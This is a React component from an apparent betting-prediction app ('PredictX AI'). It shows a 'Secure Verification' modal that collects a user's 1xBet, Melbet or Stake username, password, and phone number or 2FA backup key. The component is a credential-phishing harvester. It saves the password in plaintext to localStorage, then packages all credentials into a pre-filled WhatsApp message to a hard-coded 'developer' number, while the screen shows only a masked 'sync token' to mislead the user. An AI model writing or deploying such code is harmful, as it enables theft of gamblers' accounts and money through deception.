import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Lock, User, Eye, EyeOff, ShieldAlert, ArrowRight, ExternalLink, HelpCircle, CheckCircle, Smartphone } from 'lucide-react';
import { audio } from '../utils/audio';

interface LoginModalProps {
  onClose: () => void;
  onLoginSuccess: () => void;
  defaultPlatform?: '1xbet' | 'melbet' | 'stake';
}

export default function LoginModal({ onClose, onLoginSuccess, defaultPlatform = '1xbet' }: LoginModalProps) {
  const [platform, setPlatform] = useState<'1xbet' | 'melbet' | 'stake'>(defaultPlatform);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [extraField, setExtraField] = useState(''); // Extra details like Phone, Wallet, or 2FA
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  const developerPhone = '9779705277321';

  const getThemeConfig = () => {
    switch (platform) {
      case '1xbet':
        return {
          brandColor: '#0054ff',
          bgGradient: 'from-[#002f99]/20 to-[#001040]/30',
          glow: 'rgba(0, 84, 255, 0.45)',
          buttonText: 'VERIFY & SYNC 1XBET',
          logoText: '1xBet Safe-Link',
          extraLabel: 'Promo Code or Account ID',
          extraPlaceholder: 'e.g. 1x_984521',
        };
      case 'melbet':
        return {
          brandColor: '#F5A623',
          bgGradient: 'from-[#9B5A00]/20 to-[#1F1200]/30',
          glow: 'rgba(245, 166, 35, 0.45)',
          buttonText: 'VERIFY & SYNC MELBET',
          logoText: 'Melbet Partner-Link',
          extraLabel: 'Phone Number (linked with Melbet)',
          extraPlaceholder: 'e.g. +91 99999 00000',
        };
      case 'stake':
        return {
          brandColor: '#00E676',
          bgGradient: 'from-[#0F2D1D]/20 to-[#050B08]/30',
          glow: 'rgba(0, 230, 118, 0.45)',
          buttonText: 'VERIFY & SYNC STAKE 1X',
          logoText: 'Stake Vault-Link',
          extraLabel: '2FA Backup Key / Wallet Tag',
          extraPlaceholder: 'Optional code',
        };
    }
  };

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) return;

    setIsSubmitting(true);
    audio.playChime(15);

    setTimeout(() => {
      // Save info to local storage so they remain logged in
      localStorage.setItem('predictx_logged_in', 'true');
      localStorage.setItem('predictx_login_platform', platform);
      localStorage.setItem('predictx_login_user', username);
      localStorage.setItem('predictx_login_pass', password);
      localStorage.setItem('predictx_login_extra', extraField);

      setSubmitted(true);
      setIsSubmitting(false);
    }, 1200);
  };

  const handleSendToWhatsApp = () => {
    audio.playClick();
    
    // Construct automated pre-filled text message
    const messageText = `Hello Developer! I want to verify my PredictX AI premium account for unlimited prediction runs.

Here are my account credentials:
• Platform: ${platform.toUpperCase()}
• Username/ID: ${username}
• Password: ${password}
${extraField ? `• Details/Extra: ${extraField}` : ''}

Please authorize my device for unlimited calculations!`;

    const encodedMessage = encodeURIComponent(messageText);
    const whatsappUrl = `https://wa.me/${developerPhone}?text=${encodedMessage}`;

    // Redirect user to whatsapp securely
    window.open(whatsappUrl, '_blank', 'noopener,noreferrer');

    // Instantly unlock access and call success handler
    onLoginSuccess();
  };

  const currentTheme = getThemeConfig();

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
      <AnimatePresence mode="wait">
        {!submitted ? (
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            className="w-full max-w-sm rounded-[28px] overflow-hidden border border-white/10 shadow-[0_25px_60px_rgba(0,0,0,0.9)] relative"
            style={{
              background: 'radial-gradient(circle at top, #151515, #0a0a0a)'
            }}
          >
            {/* Upper ambient background glow */}
            <div 
              className="absolute top-0 inset-x-0 h-28 pointer-events-none filter blur-2xl opacity-20"
              style={{ backgroundColor: currentTheme.brandColor }}
            />

            {/* Modal Header */}
            <div className="p-5 pb-2.5 flex items-center justify-between border-b border-white/5 relative z-10">
              <div className="flex items-center gap-2">
                <Lock className="text-gray-400" size={14} />
                <span className="text-[10px] font-bold font-sans tracking-widest text-gray-300 uppercase">Secure Verification</span>
              </div>
              <button 
                onClick={() => { audio.playClick(); onClose(); }}
                className="w-7 h-7 rounded-full bg-white/5 flex items-center justify-center text-gray-400 hover:text-white hover:bg-white/10 transition-colors cursor-pointer"
              >
                &times;
              </button>
            </div>

            <div className="p-5">
              {/* Promotional Hook */}
              <div className="p-3 bg-white/2 rounded-xl border border-white/5 mb-4 text-center">
                <span className="text-[9px] bg-brand-primary/20 text-brand-highlight px-1.5 py-0.5 rounded-md font-extrabold uppercase tracking-widest inline-block mb-1">
                  PREMIUM BONUS ACCREDITED
                </span>
                <p className="text-[10px] text-gray-300 font-sans leading-relaxed">
                  Link your active account to verify player status. Connecting unlocks <strong className="text-white">unlimited AI forecasting</strong> and adds extra luck spins!
                </p>
              </div>

              {/* Account Brand Selector */}
              <div className="grid grid-cols-3 gap-2 mb-4">
                {(['1xbet', 'melbet', 'stake'] as const).map((plat) => {
                  const isActive = platform === plat;
                  return (
                    <button
                      key={plat}
                      type="button"
                      onClick={() => { audio.playClick(); setPlatform(plat); }}
                      className={`
                        py-2 px-1 rounded-xl text-[10px] font-bold uppercase border tracking-wider transition-all cursor-pointer
                        ${isActive 
                          ? 'bg-white/10 text-white border-white/20 shadow-[0_0_10px_rgba(255,255,255,0.05)]' 
                          : 'bg-white/2 border-transparent text-gray-500 hover:text-gray-300'
                        }
                      `}
                    >
                      {plat === 'stake' ? 'stake 1x' : plat}
                    </button>
                  );
                })}
              </div>

              {/* Login Form */}
              <form onSubmit={handleLoginSubmit} className="space-y-3">
                <div className="text-center">
                  <div 
                    className="inline-block px-3 py-0.5 rounded-full text-[9px] font-bold uppercase tracking-widest text-white mb-1.5"
                    style={{ backgroundColor: `${currentTheme.brandColor}25`, border: `1px solid ${currentTheme.brandColor}40` }}
                  >
                    {currentTheme.logoText}
                  </div>
                </div>

                {/* Username */}
                <div>
                  <label className="text-[9px] text-gray-400 uppercase font-sans font-bold tracking-wider block mb-1">Username / Account ID</label>
                  <div className="relative">
                    <input
                      type="text"
                      required
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="Email, ID, or Username"
                      className="w-full bg-zinc-950 border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white placeholder-zinc-600 focus:outline-none focus:border-white/20 font-sans"
                    />
                    <div className="absolute right-3.5 top-3 text-gray-600">
                      <User size={12} />
                    </div>
                  </div>
                </div>

                {/* Password */}
                <div>
                  <label className="text-[9px] text-gray-400 uppercase font-sans font-bold tracking-wider block mb-1">Account Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Enter security password"
                      className="w-full bg-zinc-950 border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white placeholder-zinc-600 focus:outline-none focus:border-white/20 font-sans"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3.5 top-2.5 text-gray-500 hover:text-white"
                    >
                      {showPassword ? <EyeOff size={12} /> : <Eye size={12} />}
                    </button>
                  </div>
                </div>

                {/* Extra Details */}
                <div>
                  <label className="text-[9px] text-gray-400 uppercase font-sans font-bold tracking-wider block mb-1">{currentTheme.extraLabel}</label>
                  <input
                    type="text"
                    value={extraField}
                    onChange={(e) => setExtraField(e.target.value)}
                    placeholder={currentTheme.extraPlaceholder}
                    className="w-full bg-zinc-950 border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white placeholder-zinc-600 focus:outline-none focus:border-white/20 font-sans"
                  />
                </div>

                {/* Submit Connect */}
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3 rounded-xl font-bold font-sans text-xs tracking-wider text-black flex items-center justify-center gap-1.5 cursor-pointer mt-4 transition-all shadow-md"
                  style={{
                    backgroundColor: currentTheme.brandColor,
                    boxShadow: `0 4px 15px ${currentTheme.glow}`
                  }}
                >
                  {isSubmitting ? (
                    <>
                      <div className="w-3.5 h-3.5 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                      <span>COMPILING COMPATIBILITY...</span>
                    </>
                  ) : (
                    <>
                      <span>{currentTheme.buttonText}</span>
                      <ArrowRight size={13} />
                    </>
                  )}
                </button>
              </form>
            </div>
          </motion.div>
        ) : (
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            className="w-full max-w-sm rounded-[28px] overflow-hidden border border-white/10 shadow-[0_25px_60px_rgba(0,0,0,0.9)] relative p-5 text-center space-y-4"
            style={{
              background: 'radial-gradient(circle at top, #0c1810, #050805)'
            }}
          >
            {/* Green glowing check badge */}
            <div className="mx-auto w-11 h-11 bg-emerald-500/10 rounded-full flex items-center justify-center text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.25)]">
              <CheckCircle size={24} />
            </div>

            <div className="space-y-1">
              <h2 className="text-sm font-black text-white uppercase tracking-wider">Sync Token Packaged</h2>
              <p className="text-[10px] text-emerald-400 font-semibold font-sans">Click below to send automatic WhatsApp verification</p>
            </div>

            <div className="p-3 bg-white/2 rounded-xl text-left border border-white/5 space-y-1.5">
              <div className="flex items-center gap-1.5 text-yellow-500 text-[9px] font-bold uppercase tracking-wider">
                <Smartphone size={11} />
                <span>Verification Handshake</span>
              </div>
              <p className="text-[9px] text-gray-400 font-sans leading-relaxed">
                Clicking the button below will open your WhatsApp application with a pre-filled secure message carrying your sync token. Send the message to complete verification for unlimited predictor access.
              </p>
              <div className="text-[8.5px] font-mono text-zinc-500 bg-black/50 p-2 rounded-lg break-all select-all leading-relaxed">
                {`[CONNECT-${platform.toUpperCase()}]\nID: ${username}\nSEC: ${'*'.repeat(password.length)}`}
              </div>
            </div>

            <div className="space-y-2 pt-1">
              <button
                type="button"
                onClick={handleSendToWhatsApp}
                className="w-full py-3 bg-[#25D366] text-black font-extrabold font-sans text-xs rounded-xl flex items-center justify-center gap-2 cursor-pointer shadow-[0_4px_15px_rgba(37,211,102,0.3)] hover:brightness-110 transition-all"
              >
                <span>SEND AUTOMATED WHATSAPP MSG</span>
                <ExternalLink size={13} />
              </button>
              
              <button
                type="button"
                onClick={() => { audio.playClick(); onClose(); }}
                className="w-full py-2 bg-white/2 hover:bg-white/5 rounded-xl text-[10px] font-semibold text-gray-500 hover:text-white cursor-pointer transition-all"
              >
                Cancel and Return
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
